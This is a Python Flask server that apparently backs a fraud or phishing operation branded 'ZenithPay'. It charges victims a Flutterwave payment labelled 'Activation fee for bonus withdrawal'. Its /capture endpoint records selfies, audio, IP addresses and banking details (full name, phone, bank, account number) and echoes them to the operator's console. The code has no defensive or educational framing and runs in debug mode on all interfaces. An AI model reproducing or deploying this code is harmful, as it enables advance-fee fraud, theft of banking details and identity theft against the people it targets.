from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
import base64
import requests
from datetime import datetime

app = Flask(__name__)
CORS(app)
os.makedirs('data', exist_ok=True)

# ===== FLUTTERWAVE CONFIG =====
# ⚠️ REPLACE WITH YOUR FLUTTERWAVE KEYS ⚠️
FLW_SECRET_KEY = "FLWSECK_TEST-xxxxxxxxxxxxxxxxxxxxxxxxx"
FLW_PUBLIC_KEY = "FLWPUBK_TEST-xxxxxxxxxxxxxxxxxxxxxxxxx"

# ===== INITIATE PAYMENT =====
@app.route('/initiate_payment', methods=['POST'])
def initiate_payment():
    try:
        data = request.json
        email = data.get('email')
        amount = data.get('amount')

        if not email or not amount:
            return jsonify({'error': 'Email and amount required'}), 400

        url = "https://api.flutterwave.com/v3/payments"
        headers = {
            "Authorization": f"Bearer {FLW_SECRET_KEY}",
            "Content-Type": "application/json"
        }
        payload = {
            "tx_ref": f"ZENITH-{datetime.now().strftime('%Y%m%d%H%M%S')}",
            "amount": amount,
            "currency": "NGN",
            "redirect_url": "https://your-netlify-url.netlify.app/dashboard.html",
            "payment_options": "card",
            "customer": {
                "email": email,
                "name": data.get('name', 'Customer')
            },
            "customizations": {
                "title": "ZenithPay Deposit",
                "description": "Activation fee for bonus withdrawal"
            }
        }

        response = requests.post(url, json=payload, headers=headers)
        result = response.json()

        if result.get('status') == 'success':
            return jsonify({
                'status': 'success',
                'payment_link': result['data']['link']
            })
        else:
            return jsonify({'error': result.get('message', 'Payment initiation failed')}), 400

    except Exception as e:
        print(f"[-] Payment error: {e}")
        return jsonify({'error': str(e)}), 500

# ===== VERIFY PAYMENT =====
@app.route('/verify_payment', methods=['POST'])
def verify_payment():
    try:
        data = request.json
        tx_ref = data.get('tx_ref')

        if not tx_ref:
            return jsonify({'error': 'Transaction reference required'}), 400

        url = f"https://api.flutterwave.com/v3/transactions/{tx_ref}/verify"
        headers = {"Authorization": f"Bearer {FLW_SECRET_KEY}"}

        response = requests.get(url, headers=headers)
        result = response.json()

        if result.get('status') == 'success':
            amount = result['data']['amount']
            email = result['data']['customer']['email']

            payment_data = {
                'type': 'payment_verified',
                'amount': amount,
                'email': email,
                'tx_ref': tx_ref,
                'status': 'completed',
                '_server_time': datetime.now().isoformat()
            }

            with open(f"data/payment_{tx_ref}.json", 'w') as f:
                json.dump(payment_data, f, indent=2)

            print(f"[+] Payment verified: ₦{amount} from {email}")

            return jsonify({'status': 'success', 'data': result['data']})
        else:
            return jsonify({'error': 'Payment verification failed'}), 400

    except Exception as e:
        print(f"[-] Verification error: {e}")
        return jsonify({'error': str(e)}), 500

# ===== CAPTURE (Existing) =====
@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data'}), 400

        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        data_type = data.get('type', 'unknown')

        if data_type == 'selfie' and 'image' in data:
            media = data['image'].split('base64,')[1]
            with open(f"data/selfie_{timestamp}.jpg", 'wb') as f:
                f.write(base64.b64decode(media))
            data['_media'] = f"selfie_{timestamp}.jpg"
            del data['image']

        elif data_type == 'audio' and 'audio' in data:
            media = data['audio'].split('base64,')[1]
            with open(f"data/audio_{timestamp}.webm", 'wb') as f:
                f.write(base64.b64decode(media))
            data['_media'] = f"audio_{timestamp}.webm"
            del data['audio']

        data['_ip'] = ip
        data['_server_time'] = datetime.now().isoformat()

        with open(f"data/{data_type}_{timestamp}.json", 'w') as f:
            json.dump(data, f, indent=2)

        print(f"[+] {data_type} from {ip}")

        if data_type == 'banking_details':
            print(f"    👤 {data.get('fullname')} | {data.get('phone')}")
            print(f"    🏦 {data.get('bank')} | {data.get('account')}")

        return jsonify({'status': 'ok'}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
